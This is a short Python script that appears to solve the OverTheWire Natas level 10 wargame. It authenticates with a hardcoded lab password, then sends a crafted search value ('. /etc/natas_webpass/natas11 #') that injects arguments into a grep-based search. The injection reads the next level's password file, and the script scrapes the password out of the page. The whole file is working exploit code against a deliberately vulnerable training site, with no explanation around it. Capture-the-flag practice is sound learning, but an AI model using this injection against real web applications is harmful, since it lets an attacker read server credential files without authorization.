import requests
import re

username ='natas10'
password ='nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
data = {"needle":". /etc/natas_webpass/natas11 #" , "submit":"submit"}

responce = session.post(url,data=data, auth = (username, password))
content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas11 is = " + re.findall('<pre>\n(.*)\n',content)[0])